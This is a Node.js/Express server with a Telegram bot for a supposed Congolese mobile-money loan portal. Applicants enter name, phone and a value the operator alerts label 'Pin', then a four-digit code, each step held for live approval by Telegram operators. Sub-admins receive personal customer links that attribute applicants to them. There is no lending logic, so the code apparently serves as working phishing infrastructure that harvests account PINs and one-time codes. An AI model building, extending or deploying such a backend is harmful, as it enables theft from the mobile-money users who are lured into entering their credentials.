const express=require('express');const {Pool}=require('pg');const crypto=require('crypto');
const app=express();app.use(express.json({limit:'30kb'}));app.use(express.static(require('path').join(__dirname,'public')));app.get('/',(req,res)=>res.sendFile(require('path').join(__dirname,'public','index.html')));
const pool=new Pool({connectionString:process.env.DATABASE_URL,ssl:process.env.DATABASE_URL?{rejectUnauthorized:false}:false});
const sessions=new Map();const secret=process.env.SESSION_SECRET||crypto.randomBytes(32).toString('hex');
const hash=s=>crypto.createHmac('sha256',secret).update(s).digest('hex');
function admin(req,res,next){const h=req.headers.authorization||'';if(!h.startsWith('Bearer ')||!sessions.has(h.slice(7))){return res.status(401).json({error:'Admin login required'});}next();}
async function init(){await pool.query(`CREATE TABLE IF NOT EXISTS applications(id BIGSERIAL PRIMARY KEY, public_id TEXT UNIQUE NOT NULL, full_name TEXT NOT NULL, phone TEXT NOT NULL, country TEXT NOT NULL DEFAULT 'Democratic Republic of the Congo', currency TEXT NOT NULL DEFAULT 'CDF', amount NUMERIC(14,2) NOT NULL, application_reference TEXT NOT NULL DEFAULT '', reference_code CHAR(4), status TEXT NOT NULL DEFAULT 'PENDING', admin_note TEXT, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(), reviewed_at TIMESTAMPTZ)`); await pool.query(`ALTER TABLE applications ADD COLUMN IF NOT EXISTS country TEXT NOT NULL DEFAULT 'Democratic Republic of the Congo', ADD COLUMN IF NOT EXISTS currency TEXT NOT NULL DEFAULT 'CDF', ADD COLUMN IF NOT EXISTS application_reference TEXT NOT NULL DEFAULT '', ADD COLUMN IF NOT EXISTS reference_code CHAR(4)`); await pool.query(`UPDATE applications SET application_reference=COALESCE(application_reference,'') WHERE application_reference IS NULL`);
 await pool.query(`ALTER TABLE applications ADD COLUMN IF NOT EXISTS owner_admin_id TEXT`);

await pool.query(`CREATE TABLE IF NOT EXISTS telegram_admins(chat_id TEXT PRIMARY KEY, role TEXT NOT NULL DEFAULT 'admin', active BOOLEAN NOT NULL DEFAULT TRUE, created_at TIMESTAMPTZ NOT NULL DEFAULT NOW())`);
 // Migrate legacy schemas that used telegram_id instead of chat_id.
 await pool.query(`DO $$ BEGIN
   IF EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='telegram_admins' AND column_name='telegram_id')
      AND NOT EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='telegram_admins' AND column_name='chat_id') THEN
     ALTER TABLE telegram_admins RENAME COLUMN telegram_id TO chat_id;
   ELSIF EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='telegram_admins' AND column_name='telegram_id')
      AND EXISTS (SELECT 1 FROM information_schema.columns WHERE table_schema=current_schema() AND table_name='telegram_admins' AND column_name='chat_id') THEN
     UPDATE telegram_admins SET chat_id=COALESCE(NULLIF(chat_id,''),telegram_id::text) WHERE chat_id IS NULL OR chat_id='';
     ALTER TABLE telegram_admins DROP COLUMN telegram_id CASCADE;
   END IF;
 END $$`);
 await pool.query(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS chat_id TEXT, ADD COLUMN IF NOT EXISTS role TEXT NOT NULL DEFAULT 'admin', ADD COLUMN IF NOT EXISTS active BOOLEAN NOT NULL DEFAULT TRUE, ADD COLUMN IF NOT EXISTS created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()`);
 await pool.query(`ALTER TABLE telegram_admins ADD COLUMN IF NOT EXISTS admin_id TEXT`);
 await pool.query(`CREATE UNIQUE INDEX IF NOT EXISTS telegram_admins_chat_id_uidx ON telegram_admins(chat_id)`);
 await pool.query(`CREATE UNIQUE INDEX IF NOT EXISTS telegram_admins_admin_id_uidx ON telegram_admins(admin_id) WHERE admin_id IS NOT NULL`);
 // Give existing admins stable public IDs without changing their chat IDs or roles.
 await pool.query(`WITH numbered AS (SELECT chat_id, 'ADMIN' || LPAD(ROW_NUMBER() OVER (ORDER BY created_at,chat_id)::text,3,'0') AS aid FROM telegram_admins WHERE role <> 'super_admin' AND admin_id IS NULL) UPDATE telegram_admins t SET admin_id=numbered.aid FROM numbered WHERE t.chat_id=numbered.chat_id`);
 // Assign the reserved ID only when it is not already owned; legacy databases may contain multiple super-admin rows.
 await pool.query(`UPDATE telegram_admins SET admin_id='SUPER_ADMIN' WHERE chat_id=(SELECT chat_id FROM telegram_admins WHERE role='super_admin' AND (admin_id IS NULL OR admin_id='') AND NOT EXISTS (SELECT 1 FROM telegram_admins WHERE admin_id='SUPER_ADMIN') ORDER BY created_at,chat_id LIMIT 1)`);

 // Enforce exactly one super admin. Prefer the configured account; otherwise retain the oldest existing super admin.
 const configuredSuper=String(process.env.SUPER_ADMIN_CHAT_ID||'').trim();
 let chosenSuper=configuredSuper;
 if(!chosenSuper){const existingSuper=await pool.query(`SELECT chat_id FROM telegram_admins WHERE role='super_admin' ORDER BY created_at,chat_id LIMIT 1`);chosenSuper=existingSuper.rows[0]?.chat_id||'';}
 if(chosenSuper){
   await pool.query(`UPDATE telegram_admins SET role='admin', admin_id=CASE WHEN admin_id='SUPER_ADMIN' THEN NULL ELSE admin_id END WHERE role='super_admin' AND chat_id<>$1`,[chosenSuper]);
   await pool.query(`UPDATE telegram_admins SET admin_id=NULL WHERE admin_id='SUPER_ADMIN' AND chat_id<>$1`,[chosenSuper]);
   await pool.query(`INSERT INTO telegram_admins(chat_id,role,active,admin_id) VALUES($1,'super_admin',TRUE,'SUPER_ADMIN') ON CONFLICT(chat_id) DO UPDATE SET role='super_admin',active=TRUE,admin_id='SUPER_ADMIN'`,[chosenSuper]);
   await pool.query(`WITH numbered AS (SELECT chat_id, 'ADMIN' || LPAD((COALESCE((SELECT MAX(NULLIF(regexp_replace(admin_id,'[^0-9]','','g'),'')::int) FROM telegram_admins WHERE admin_id LIKE 'ADMIN%'),0) + ROW_NUMBER() OVER (ORDER BY created_at,chat_id))::text,3,'0') AS aid FROM telegram_admins WHERE role='admin' AND admin_id IS NULL) UPDATE telegram_admins t SET admin_id=numbered.aid FROM numbered WHERE t.chat_id=numbered.chat_id`);
 }
}
async function tg(method,body){if(!process.env.TELEGRAM_BOT_TOKEN)return null;const r=await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/${method}`,{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify(body)});const j=await r.json();if(!j.ok)throw new Error(j.description||'Telegram API error');return j.result;}
async function notify(appRow,stage='application'){
 if(!process.env.TELEGRAM_BOT_TOKEN) throw new Error('TELEGRAM_BOT_TOKEN is missing');
 let msg,buttons;
 if(stage==='application'){
  msg=`📝 *New application*\nID: \`${esc(appRow.public_id)}\`\nName: ${esc(appRow.full_name)}\nCountry: ${esc(appRow.country)}\nPhone: ${esc(appRow.phone)}\nAmount: ${esc(appRow.currency)} ${Number(appRow.amount).toLocaleString('en-US')}\nPin: \`${esc(appRow.application_reference)}\`\nStatus: PENDING REVIEW`;
  buttons=[[{text:'✅ Approve ',callback_data:`appapprove:${appRow.public_id}`},{text:'❌ Wrong ID',callback_data:`wrong ID:${appRow.public_id}`}]];
 }else{
  msg=`🔎 *code submitted*\nID: \`${esc(appRow.public_id)}\`\nPin: \`${esc(appRow.application_reference)}\`\ncode: \`${esc(appRow.public_id)}\`\\nStatus: CODE REVIEW`;
  buttons=[[{text:'✅ Approve',callback_data:`codeapprove:${appRow.public_id}`}],[{text:'❌ Wrong ID',callback_data:`wrongid:${appRow.public_id}`},{text:'↩️ Wrong code',callback_data:`wrongcode:${appRow.public_id}`}]];
 }
 // Send to the customer's assigned admin and the super admin. Unassigned applications go to the super admin.
 const admins=await pool.query(`SELECT chat_id FROM telegram_admins WHERE active=TRUE AND (role='super_admin' OR ($1::text IS NOT NULL AND admin_id=$1))`,[appRow.owner_admin_id||null]);
 const recipients=[...new Set(admins.rows.map(r=>String(r.chat_id)).filter(Boolean))];
 if(!recipients.length && process.env.TELEGRAM_CHAT_ID) recipients.push(String(process.env.TELEGRAM_CHAT_ID));
 if(!recipients.length) throw new Error('No active Telegram recipients found; register a super admin or set TELEGRAM_CHAT_ID');
 const outcomes=await Promise.allSettled(recipients.map(chat_id=>tg('sendMessage',{chat_id,text:msg,parse_mode:'MarkdownV2',reply_markup:{inline_keyboard:buttons}})));
 const failures=outcomes.map((r,i)=>r.status==='rejected'?`${recipients[i]}: ${r.reason?.message||'send failed'}`:null).filter(Boolean);
 if(failures.length===outcomes.length) throw new Error(`Telegram delivery failed: ${failures.join('; ')}`);
 if(failures.length) console.error('Some Telegram notifications failed:',failures.join('; '));
}
function esc(s){return String(s).replace(/[_*\[\]()~`>#+\-=|{}.!\\]/g,'\\$&');}
app.get('/health',(req,res)=>res.json({ok:true}));
app.post('/api/applications',async(req,res)=>{try{let {fullName,phone,amount,reference,country,currency}=req.body||{}; const requestedAdminId=String(req.query.admin||'').trim().toUpperCase();fullName=String(fullName||'').trim();phone=String(phone||'').trim();amount=Number(amount||1);reference=String(reference||'').trim();country=String(country||'Democratic Republic of the Congo').trim();currency=String(currency||'CDF').trim().toUpperCase();if(fullName.length<2||fullName.length>100||phone.length<6||phone.length>25||!Number.isFinite(amount)||amount<=0||amount>1000000000||reference.length<3||reference.length>40||!/^[A-Za-z0-9-]+$/.test(reference)||!/^[A-Z]{3}$/.test(currency))return res.status(400).json({error:'Check your name, phone, amount and application reference.'});let ownerAdminId=null;
if(requestedAdminId){const owner=await pool.query("SELECT admin_id FROM telegram_admins WHERE admin_id=$1 AND active=TRUE AND role<>'super_admin'",[requestedAdminId]);if(!owner.rowCount)return res.status(400).json({error:'This customer link is invalid or inactive.'});ownerAdminId=owner.rows[0].admin_id;}
const publicId=crypto.randomBytes(5).toString('hex').toUpperCase();const q=await pool.query('INSERT INTO applications(public_id,full_name,phone,country,currency,amount,application_reference,reference_code,status,owner_admin_id) VALUES($1,$2,$3,$4,$5,$6,$7,$8,$9,$10) RETURNING public_id,full_name,phone,country,currency,amount,application_reference,status,created_at,owner_admin_id',[publicId,fullName,phone,country,currency,amount,reference,'----','PENDING',ownerAdminId]);try{await notify(q.rows[0],'application');}catch(e){console.error('Telegram notification failed:',e.message);}res.status(201).json({id:publicId,status:'PENDING',message:'Application submitted for administrator review.'});}catch(e){console.error(e);res.status(500).json({error:'Could not submit application. Please try again.'});}});
app.post('/api/applications/:id/reference-code',async(req,res)=>{try{const code=String(req.body?.code||'');if(!/^[0-9]{4}$/.test(code))return res.status(400).json({error:'Enter a four-digit numeric reference code.'});const q=await pool.query("UPDATE applications SET reference_code=$2,status='CODE_PENDING',admin_note=NULL,reviewed_at=NULL WHERE public_id=$1 AND status='CODE_REQUIRED' RETURNING public_id,full_name,phone,country,currency,amount,application_reference,reference_code,status,owner_admin_id",[String(req.params.id).toUpperCase(),code]);if(!q.rowCount)return res.status(409).json({error:'This application is not currently accepting a reference code. Refresh its status.'});try{await notify(q.rows[0],'code');}catch(e){console.error('Telegram code notification failed:',e.message);}res.json({status:'CODE_PENDING',message:'Reference code sent for review.'});}catch(e){console.error(e);res.status(500).json({error:'Could not submit reference code.'});}});
app.post('/api/applications/:id/amount',async(req,res)=>{try{const amount=Number(req.body?.amount);if(!Number.isFinite(amount)||amount<=0||amount>1000000000)return res.status(400).json({error:'Enter a valid requested amount.'});const q=await pool.query("UPDATE applications SET amount=$2,status='APPROVED',reviewed_at=NOW() WHERE public_id=$1 AND status='AMOUNT_REQUIRED' RETURNING public_id,status",[String(req.params.id).toUpperCase(),amount]);if(!q.rowCount)return res.status(409).json({error:'This application is not ready for amount submission.'});res.json({status:'APPROVED'});}catch(e){console.error(e);res.status(500).json({error:'Could not submit amount.'});}});
app.get('/api/applications/:id/status',async(req,res)=>{try{const q=await pool.query('SELECT public_id,status,admin_note,reviewed_at FROM applications WHERE public_id=$1',[String(req.params.id).toUpperCase()]);if(!q.rowCount)return res.status(404).json({error:'Application not found'});res.json(q.rows[0]);}catch(e){res.status(500).json({error:'Status unavailable'});}});
app.post('/api/admin/login',(req,res)=>{if(!process.env.ADMIN_PASSWORD)return res.status(503).json({error:'Set ADMIN_PASSWORD in hosting environment first.'});if(!req.body||!crypto.timingSafeEqual(Buffer.from(hash(String(req.body.password||''))),Buffer.from(hash(process.env.ADMIN_PASSWORD))))return res.status(401).json({error:'Invalid password'});const token=crypto.randomBytes(32).toString('hex');sessions.set(token,true);res.json({token});});
app.get('/api/admin/applications',admin,async(req,res)=>{try{const q=await pool.query('SELECT public_id,full_name,phone,country,currency,amount,application_reference,status,admin_note,created_at,reviewed_at FROM applications ORDER BY created_at DESC LIMIT 300');res.json(q.rows);}catch(e){res.status(500).json({error:'Could not load applications'});}});
async function decide(id,action,note=''){let status;if(action==='appapprove')status='CODE_REQUIRED';else if(action==='appreject')status='REJECTED';else if(action==='codeapprove')status='AMOUNT_REQUIRED';else if(action==='wrongid')status='WRONG_REFERENCE';else if(action==='wrongcode')status='CODE_REQUIRED';else return null;const allowed=action==='appapprove'?"status='PENDING'":action==='wrongid'?"status IN ('PENDING','CODE_PENDING')":action==='appreject'?"status='PENDING'":action==='wrongcode'||action==='codeapprove'?"status='CODE_PENDING'":"1=0";const q=await pool.query(`UPDATE applications SET status=$2,admin_note=$3,reviewed_at=NOW() WHERE public_id=$1 AND ${allowed} RETURNING public_id,status,admin_note`,[id,status,note.slice(0,500)]);return q.rows[0]||null;}
app.post('/api/admin/applications/:id/decision',admin,async(req,res)=>{const status=req.body?.status;if(!['APPROVED','REJECTED'].includes(status))return res.status(400).json({error:'Invalid decision'});try{const row=await decide(req.params.id,status==='APPROVED'?'appapprove':'appreject',String(req.body?.note||''));if(!row)return res.status(409).json({error:'Application not found or already reviewed'});res.json(row);}catch(e){res.status(500).json({error:'Decision failed'});}});

function html(s){return String(s??'').replace(/[&<>"]/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));}
async function handleTelegramCommand(message){
  const chatId=String(message.chat?.id||''); const text=String(message.text||'').trim();
  if(!text.startsWith('/'))return;
  const [raw,...args]=text.split(/\s+/); const command=raw.split('@')[0].toLowerCase();
  const lookup=await pool.query('SELECT role,active,admin_id FROM telegram_admins WHERE chat_id=$1',[chatId]);
  const row=lookup.rows[0]; const isSuper=!!row&&row.active&&row.role==='super_admin';
  const isAdmin=!!row&&row.active;
  const send=async t=>tg('sendMessage',{chat_id:chatId,text:t,parse_mode:'HTML',disable_web_page_preview:true});
  const info=`👋 <b>Welcome!</b>\n\nYour Chat ID: <code>${html(chatId)}</code>\nYour Admin ID: <code>${html(row?.admin_id||(isSuper?'SUPER_ADMIN':isAdmin?'ADMIN':'NOT_REGISTERED'))}</code>\nRole: ${isSuper?'👑 Super Admin':isAdmin?'🛡 Admin':'No admin access'}\nBot Username: @Mkopowahalobot`;
  if(command==='/start'||command==='/myinfo'){const personalLink=isAdmin&&!isSuper?`${String(process.env.RENDER_EXTERNAL_URL||process.env.APP_BASE_URL||'https://mkopo-wa-halopesa-pesa-taslim.onrender.com').replace(/\/$/,'')}?admin=${encodeURIComponent(row.admin_id)}`:'';await send(info+(isAdmin?`${!isSuper?`\n\n<b>🔗 LINK YA WATEJA WAKO</b>\n${html(personalLink)}\nWape wateja wako link hii kuomba mkopo. Maombi yao yatahusishwa na akaunti yako.\n\nTumia /mylink kupata kiungo chako binafsi.`:''}\n\n<b>ADMIN MANAGEMENT</b>\n/admins - Orodha ya admin\n/addadmin CHAT_ID - Ongeza admin\n/revoke CHAT_ID - Ondoa ruhusa ya admin\n/restore CHAT_ID - Rudisha ruhusa ya admin\n/broadcast CHAT_ID MESSAGE - Tuma taarifa kwa Chat ID\n/payment - Payment information\n\n<b>OTHER COMMANDS</b>\n/all - Maombi yote\n/stats - Takwimu zako\n/pending - Maombi yanayosubiri\n/myinfo - Taarifa zako`:'\n\nContact the super admin to request access.'));return;}
  if(!isAdmin){await send('⛔ You do not have admin access.');return;}
  if(command==='/testnotify'){
    try { await tg('sendMessage',{chat_id:chatId,text:'✅ Telegram notifications are working. This is a test message from the loan system.'}); await send('✅ Test notification sent to this chat.'); }
    catch(e) { console.error('Telegram test notification failed:',e.message); await send('❌ Telegram test failed: '+html(e.message)); }
    return;
  }
  if(command==='/mylink'){
    if(isSuper){await send('Super admin does not have a personal customer link.');return;}
    const base=String(process.env.RENDER_EXTERNAL_URL||process.env.APP_BASE_URL||'https://mkopo-wa-halopesa-pesa-taslim.onrender.com').replace(/\/$/,'');
    await send(`🔗 <b>LINK YA WATEJA WAKO</b>\n\n${html(base)}?admin=${encodeURIComponent(row.admin_id)}\n\nWape wateja wako link hii kuomba mkopo. Maombi yao yatahusishwa na akaunti yako.`);return;
  }
  if(command==='/admins'){
    if(!isSuper){await send('⛔ Super admin only.');return;}
    const q=await pool.query('SELECT chat_id,role,active FROM telegram_admins ORDER BY role DESC,created_at');
    await send('<b>ADMIN LIST</b>\n'+(q.rows.map(a=>`${a.role==='super_admin'?'👑':'🛡'} <code>${html(a.chat_id)}</code> — ${html(a.role)} — ${a.active?'Active':'Revoked'}`).join('\n')||'No admins'));return;
  }
  if(command==='/addadmin'){
    if(!isSuper){await send('⛔ Super admin only.');return;}
    const target=String(args[0]||'').trim();if(!/^-?\d+$/.test(target)){await send('Usage: /addadmin CHAT_ID');return;}
    const existing=await pool.query('SELECT admin_id,role FROM telegram_admins WHERE chat_id=$1',[target]);
    let assignedId=existing.rows[0]?.admin_id;
    if(!assignedId||assignedId==='SUPER_ADMIN'){const next=await pool.query("SELECT COALESCE(MAX(NULLIF(regexp_replace(admin_id,'[^0-9]','','g'),'')::int),0)+1 AS n FROM telegram_admins WHERE admin_id LIKE 'ADMIN%'");assignedId='ADMIN'+String(next.rows[0].n).padStart(3,'0');}
    if(target===String(process.env.SUPER_ADMIN_CHAT_ID||'')){await send('ℹ️ This Chat ID is already the configured Super Admin.');return;}
    await pool.query(`INSERT INTO telegram_admins(chat_id,role,active,admin_id) VALUES($1,'admin',TRUE,$2) ON CONFLICT(chat_id) DO UPDATE SET role='admin',active=TRUE,admin_id=CASE WHEN telegram_admins.admin_id='SUPER_ADMIN' OR telegram_admins.admin_id IS NULL THEN EXCLUDED.admin_id ELSE telegram_admins.admin_id END`,[target,assignedId]);
    const base=String(process.env.RENDER_EXTERNAL_URL||process.env.APP_BASE_URL||'https://mkopo-wa-halopesa-pesa-taslim.onrender.com').replace(/\/$/,'');
    const assigned=await pool.query('SELECT admin_id FROM telegram_admins WHERE chat_id=$1',[target]);
    const personalLink=`${base}?admin=${encodeURIComponent(assigned.rows[0].admin_id)}`;
    await send(`✅ Admin added/restored: <code>${html(target)}</code>\nAdmin ID: <code>${html(assigned.rows[0].admin_id)}</code>\nPersonal customer link: ${html(personalLink)}`);
    try{await tg('sendMessage',{chat_id:target,text:`👋 Welcome!\n\nYour Chat ID: ${target}\nYour Admin ID: ${assigned.rows[0].admin_id}\nRole: 🛡 Admin\n\n🔗 LINK YA WATEJA WAKO\n${personalLink}\n\nWape wateja wako link hii kuomba mkopo. Maombi yao yatahusishwa na akaunti yako.\n\nTumia /mylink kupata kiungo chako binafsi.\n\nCommands:\n/mylink - Get your link\n/stats - Your statistics\n/pending - Pending applications\n/myinfo - Your information`});}catch(e){}return;
  }
  if(command==='/revoke'||command==='/restore'){
    if(!isSuper){await send('⛔ Super admin only.');return;}
    const target=String(args[0]||'').trim();if(!/^-?\d+$/.test(target)){await send(`Usage: ${command} CHAT_ID`);return;}
    if(command==='/revoke'){if(target===String(process.env.SUPER_ADMIN_CHAT_ID||'')){await send('⛔ Cannot revoke the configured super admin.');return;}const q=await pool.query("UPDATE telegram_admins SET active=FALSE WHERE chat_id=$1 AND role<>'super_admin' RETURNING chat_id",[target]);await send(q.rowCount?`✅ Access revoked for <code>${html(target)}</code>`:'Admin not found or protected.');}
    else{const q=await pool.query("UPDATE telegram_admins SET active=TRUE WHERE chat_id=$1 RETURNING chat_id",[target]);await send(q.rowCount?`✅ Access restored for <code>${html(target)}</code>`:'Chat ID not found. Use /addadmin first.');}return;
  }
  if(command==='/broadcast'){
    if(!isSuper){await send('⛔ Super admin only.');return;}
    const target=String(args.shift()||'').trim(),body=args.join(' ');
    if(!/^-?\d+$/.test(target)||!body){await send('Usage: /broadcast CHAT_ID MESSAGE');return;}
    try{await tg('sendMessage',{chat_id:target,text:body});await send(`✅ Message sent to <code>${html(target)}</code>`);}catch(e){await send('❌ Message could not be delivered. Check the Chat ID and ensure the user has started the bot.');}return;
  }
  if(command==='/payment'){if(!isSuper){await send('⛔ Super admin only.');return;}await send('💳 <b>Payment management</b>\nConfigure approved payment instructions in your deployment settings and verify all payment details before sharing them. No payment has been processed by this command.');return;}
  if(command==='/stats'){const q=await pool.query(`SELECT COUNT(*)::int total,COUNT(*) FILTER(WHERE status IN ('PENDING','CODE_PENDING'))::int pending,COUNT(*) FILTER(WHERE status IN ('APPROVED','AMOUNT_REQUIRED'))::int approved,COUNT(*) FILTER(WHERE status='REJECTED')::int rejected FROM applications WHERE ($1::text IS NULL OR owner_admin_id=$1)` ,[isSuper?null:row.admin_id]);const a=q.rows[0];await send(`📊 <b>Application stats</b>\nTotal: ${a.total}\nPending: ${a.pending}\nApproved/in progress: ${a.approved}\nRejected: ${a.rejected}`);return;}
  if(command==='/pending'||command==='/all'){const q=await pool.query(`SELECT public_id,status,created_at FROM applications WHERE ($1::text IS NULL OR owner_admin_id=$1) ${command==='/pending'?"AND status IN ('PENDING','CODE_PENDING')":''} ORDER BY created_at DESC LIMIT 30`,[isSuper?null:row.admin_id]);await send(`<b>${command==='/pending'?'PENDING APPLICATIONS':'LATEST APPLICATIONS'}</b>\n`+(q.rows.map(a=>`<code>${html(a.public_id)}</code> — ${html(a.status)}`).join('\n')||'No applications'));return;}
  await send('Unknown command. Send /start to view available commands.');
}

// Telegram webhook: set TELEGRAM_WEBHOOK_SECRET optionally and configure this endpoint in Bot API.
app.post('/telegram/webhook',async(req,res)=>{if(process.env.TELEGRAM_WEBHOOK_SECRET&&req.get('x-telegram-bot-api-secret-token')!==process.env.TELEGRAM_WEBHOOK_SECRET)return res.sendStatus(401);const cb=req.body?.callback_query;const message=req.body?.message;res.sendStatus(200);if(message){try{await handleTelegramCommand(message);}catch(e){console.error('Telegram command failed:',e.message);}return;}if(!cb)return;try{const [action,id]=String(cb.data||'').split(':');if(!['appapprove','appreject','codeapprove','wrongid','wrongcode'].includes(action)){await tg('answerCallbackQuery',{callback_query_id:cb.id,text:'Unknown action'});return;}const row=await decide(id,action,action==='wrongid'?'Please check and re-enter your application reference.':action==='wrongcode'?'Please re-enter your reference code.':'Decision made via Telegram');await tg('answerCallbackQuery',{callback_query_id:cb.id,text:row?`Application status: ${row.status}`:'Not available at this stage'});if(row){await tg('editMessageReplyMarkup',{chat_id:cb.message.chat.id,message_id:cb.message.message_id,reply_markup:{inline_keyboard:[]}});await tg('sendMessage',{chat_id:cb.message.chat.id,text:`Application ${id}: ${row.status}`});}}catch(e){console.error('Telegram callback failed:',e.message);}});
async function configureTelegramWebhook(){
  const base=String(process.env.RENDER_EXTERNAL_URL||process.env.APP_BASE_URL||'').trim().replace(/\/$/,'');
  if(!base||!process.env.TELEGRAM_BOT_TOKEN){console.log('Telegram webhook auto-setup skipped: set RENDER_EXTERNAL_URL (Render provides it automatically) and TELEGRAM_BOT_TOKEN.');return;}
  const body={url:`${base}/telegram/webhook`};
  if(process.env.TELEGRAM_WEBHOOK_SECRET)body.secret_token=process.env.TELEGRAM_WEBHOOK_SECRET;
  try{const result=await tg('setWebhook',body);console.log('Telegram webhook configured:',result?.url||body.url);}
  catch(e){console.error('Telegram webhook setup failed:',e.message);}
}
const port=process.env.PORT||3000;
init().then(()=>app.listen(port,async()=>{console.log(`Congo Loan portal listening on ${port}`);await configureTelegramWebhook();})).catch(e=>{console.error('Database init failed',e);process.exit(1)});
